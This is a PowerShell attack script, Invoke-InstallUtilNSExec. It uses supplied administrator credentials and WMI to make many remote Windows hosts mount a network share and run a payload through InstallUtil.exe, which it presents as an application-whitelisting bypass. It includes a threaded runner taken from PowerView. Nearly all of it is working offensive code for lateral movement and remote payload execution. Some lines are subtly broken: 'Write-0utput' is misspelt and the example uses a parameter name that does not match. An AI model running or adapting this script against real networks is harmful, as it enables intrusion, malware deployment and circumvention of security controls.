function Invoke-InstallUtilNSExec{

<#
.SYNOPSIS

This script leverages the ability for InstallUtil to load a compatible executable from a user provided networkshare without a "LoadRemoteResource" XML config entry in .NET 4.5. 
Note: Please see the awesome research by @subTee for examples of InstallUtil compatible executables.

Author: Andrew @ch33kyf3ll0w Bonstrom
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Invoke-InstallUtilNSExec uses InstallUtil.exe to load a compatible executable from a network share via command executed over WMI with the connection using SMB. 

.PARAMETER ComputerName

Hostnames or IP adresses of the systems you wish to target. Will accept single entry or array of entries.

.PARAMETER UserName

Valid user that has administrative access on the targeted system/s.

.PARAMETER UserPassword

Valid password for the specified user.

.PARAMETER NetworkPath

The networkshare path where the InstallUtil compatible file is stored.

.PARAMETER Bin

Full name with file extension of the InstallUtil compatible payload.

.PARAMETER Arch

The architecture of the targeted operating system/s. Options are: "auto, x86, x64"

.PARAMETER Threads

Number of concurrent connections you wish to run at a time. Default is 10

.EXAMPLE

Invoke-InstallUtilNSExec -ComputerName 192.168.1.2 -UserName WORKGROUP\administrator -Password ImayHavehemorrhoids123 -NetworkPath \\HOSTNAME\SharedFolder -Bin NotABadPayload.exe -Arch x86

.VERSION
1.0

.LINK
http://subt0x10.blogspot.com/2015/08/application-whitelisting-bypasses-101.html
https://msdn.microsoft.com/en-us/library/dd409252%28v=vs.110%29.aspx

#>

    [CmdletBinding()]
    Param(
	
    [Parameter(Mandatory = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(Mandatory = $True)]
    [String]
    $UserName,
    
    [Parameter(Mandatory = $True)]
    [String]
    $UserPassword,
	
    [Parameter(Mandatory = $True)]
    [string]
    $Bin,
    	
    [Parameter(Mandatory = $True)]
    [string]
    $NetworkPath,
	
    [Parameter(Mandatory = $false)]
    [string]
    $Arch = "auto",
	
    [Parameter(Mandatory = $false)]
    [Int]
    $Threads = 10

)
try{
    #Configure a PS credential Object
    $Credential = New-Object System.Management.Automation.PSCredential($UserName, ($UserPassword | ConvertTo-SecureString -asPlainText -Force))
}
catch{
    Write-0utput "Please ensure correct parameters were used. Error: $_"

}

#Assign InstallUtil command based on $Arch selection
switch ($Arch){
     auto {
		$InstallUtilCmd = "cmd.exe /C net use `"$NetworkPath`" /User:$UserName $UserPassword && IF %processor_architecture%==AMD64 (C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /U $(`"$NetworkPath`")\$(`"$Bin`")) ELSE (C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /U $(`"$NetworkPath`")\$(`"$Bin`")) && `"$NetworkPath`" /delete /Y"
		break
	 }
     x86 {
		$InstallUtilCmd = "cmd.exe /C net use `"$NetworkPath`" /User:$UserName $UserPassword &&  C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /U $(`"$NetworkPath`")\$(`"$Bin`") && `"$NetworkPath`" /delete /Y"
		break
	 }
     x64 {
		$InstallUtilCmd = "cmd.exe /C net use `"$NetworkPath`" /User:$UserName $UserPassword &&  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /U $(`"$NetworkPath`")\$(`"$Bin`") && `"$NetworkPath`" /delete /Y"
		break
		}
	}

#Script block begins here
$RemoteScriptBlock = {
param($HostName, $InstallUtilCmd, $Credential)
    
    $a = Invoke-WmiMethod -ComputerName $HostName -Credential $Credential -Namespace 'Root\cimv2' -Class 'Win32_Process' -Name 'Create' -ArgumentList $InstallUtilCmd
	if ($a.ReturnValue -eq 0){
		Write-Output "[+] Command executed successfully against $HostName!"
	}
	else{
		Write-Output "[-] Command failed execution against $Hostname."
	}
	
}

#Additional params for the scriptblock
$ScriptParams = @{
	#'Credential' = $UserName
	'InstallUtilCmd' = $InstallUtilCmd
	
    }
try{  
    #Execute command via WMI supporting threading 
    Invoke-ThreadedFunction -HostName $ComputerName -Threads $Threads -ScriptBlock $RemoteScriptBlock -ScriptParameters $ScriptParams -Credential $Credential
}
catch{
    Write-0utput "Please ensure correct parameters were used. Error: $_"
}
}

#########################################################################################################################
#
# Helper function taken straight from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
#
#########################################################################################################################

function Invoke-ThreadedFunction {
    # Helper used by any threaded host enumeration functions
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $HostName,

        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position=2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        $Threads = 10,

        [Switch]
        $NoImports,
        
        $Credential
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # import the current session state's variables and functions so the chained PowerView
        #   functionality can be used by the threaded blocks
        if(!$NoImports) {

            # grab all the current variables for this runspace
            $MyVars = Get-Variable -Scope 2

            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

            # Add Variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach($Var in $MyVars) {
                if($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # Add Functions from current runspace to the InitialSessionState
            ForEach($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!

        # create a pool of maxThread runspaces
        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        $Jobs = @()
        $PS = @()
        $Wait = @()

        $Counter = 0
    }
    process {

        ForEach ($h in $HostName) {
   

            # make sure we get a server name
            if ($h -ne '') {

                While ($($Pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -MilliSeconds 500
                }

                # create a "powershell pipeline runner"
                $PS += [powershell]::create()

                $PS[$Counter].runspacepool = $Pool

                # add the script block + arguments
                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter('HostName', $h).AddParameter('Credential', $Credential)
                if($ScriptParameters) {
                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
                    }
                }

                # start job
                $Jobs += $PS[$Counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $Wait += $Jobs[$Counter].AsyncWaitHandle
            }
            $Counter = $Counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $WaitTimeout = Get-Date

        # set a 60 second timeout for the scanning threads
        while ($($Jobs | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -MilliSeconds 500
            }

        # end async call
        for ($y = 0; $y -lt $Counter; $y++) {

            try {
                # complete async job
                $PS[$y].EndInvoke($Jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $PS[$y].Dispose()
            }
        }
        
        $Pool.Dispose()
        Write-Verbose "All threads completed!"
		}
	}	
